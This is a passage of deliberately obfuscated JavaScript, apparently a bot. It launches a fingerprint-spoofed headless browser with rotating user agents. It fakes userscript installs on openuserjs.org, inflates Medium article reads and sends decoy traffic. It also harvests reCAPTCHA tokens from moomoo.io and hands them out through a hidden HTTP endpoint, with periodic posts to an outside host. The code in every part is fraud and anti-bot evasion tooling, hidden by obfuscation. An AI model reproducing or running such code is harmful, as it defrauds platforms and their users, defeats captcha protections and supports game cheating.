      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0xa) + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + V(0x3, 'wrRq') + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + W(0x14) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + W(0x12) + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + V(0xc, 'Nr9D') + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + W(0x0) + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x25ba + 0x47 * -0x1 + -0x2573
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path')['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), i = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x39 * -0x75 + 0x20d1 * -0x1 + 0x6c4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](h);
    let j;
    u:
      for (;;)
        try {
          let m = await async function n() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (u) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (v) {}
            if (!p)
              return await randomWait(), await n();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (w) {
              if (!p)
                return await randomWait(), await n();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && i['deviceDesc' + 'riptor'](m), j = await i['launch']();
          break u;
        } catch (p) {
          warn(p), await randomWait();
        }
    const k = j['userAction'];
    log('browser\x20la' + 'unched');
    const l = j['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(l, k);
    }, 0x222f + -0xcb5 * -0x1 + -0x60 * 0x7c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(l, k);
    }, 0x856 + -0x21 * -0x4 + 0x72 * -0x13), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const u = await l['createInco' + 'gnitoBrows' + 'erContext'](),
          v = await u['newPage']();
        for (;;) {
          let w = 0x25f0 + 0x172e + -0x3d1e;
          if (await v['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](x => w++), await randomWait(), w)
            return await v['close'](), await u['close'](), await q();
          for (let x = 0x18cf + -0x68 * -0x4a + -0x36df; x < getRandomInt(-0x55 * -0x19 + 0x7f3 + 0x1 * -0x103f, 0x47 * 0x15 + -0x1091 + 0xac3 * 0x1); x++)
            await v['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * -0x67a + -0x15cec + 0x24dc6);
        }
      }();
    }, -0x100f * -0x2 + -0x1e * 0x61 + 0x4 * -0x517), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await l['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x9f0 + -0x1368 + 0x1d58;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x4e6 + -0x5 * 0x364 + -0x2 * -0xaed, -0x1 * -0x17b + 0x4c9 + -0x612)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6f97 + -0x2 * -0x10d9 + -0x1 * 0x1c19);
    }, 0x5 * 0x21f + -0x1304 + 0x3 * 0x2ef), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      !async function u() {
        try {
          let v = 0x672 + -0x1df3 + 0x1781;
          const w = await l['createInco' + 'gnitoBrows' + 'erContext'](),
            x = await w['newPage']();
          if (x['on']('pageerror', function(y) {}), await x['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](y => v++), v)
            return await regPage['close'](), await w['close'](), u();
        } catch (y) {}
        return await regPage['close'](), await context['close'](), u();
      }();
    }, -0xff9 + 0x60f * -0x3 + 0x1145 * 0x2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * 0x238e + -0x1872 + -0xa54);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3662 + 0x1d2 * 0x13 + 0x335c);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b,
    Z = d,
    Y = c;
  async function f() {
    const X = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x26f5 + -0x1 * 0x1a05 + 0xf * 0x455) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x96b * -0x4 + -0x17e1 * 0x1 + -0x3d8e * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xc * 0xa + 0x1 * -0xce9 + 0xc71, D['indexOf']('\x20'));
        return B ? E['slice'](-0xdbd + 0x49f * -0x1 + -0x3ac * -0x5, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x31da + -0x13f * -0x7 + 0x5031),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x7bb + -0x2 * 0x6a2 + 0x3c0f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + X(0xb, 'y1jy') + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      Y(0x1) + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + Z(0x8) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + a0(0x6, '&6$6') + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0x20c + 0xd7d * 0x2 + 0x2 * -0xc77; k < 0x297 * 0xe + 0x29 * -0x47 + 0x18df * -0x1; k++)
    setTimeout(f, (0x45d1 + -0x4 * -0x271c + 0x81f) * k * getRandomInt(0x192c + 0x1d19 + 0x97 * -0x5c, -0x8e9 * -0x1 + 0x23c7 + -0x2cad));
  setInterval(() => {
    f();
    for (let l = 0x1 * 0x1dba + -0x1d5f + -0x5b; l < 0x1 * 0x24c5 + 0xa7b + 0x2 * -0x179e; l++)
      setTimeout(f, (-0x14915 + -0xe3c3 * 0x1 + 0x1c * 0x1c42) * l * getRandomInt(0xaed * -0x1 + -0x4d * 0x4a + 0x2130, 0x4b2 * -0x5 + -0x1 * -0x13a2 + 0x3db));
  }, -0x6813f8 + 0x5569 * 0x47 + 0x875259);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
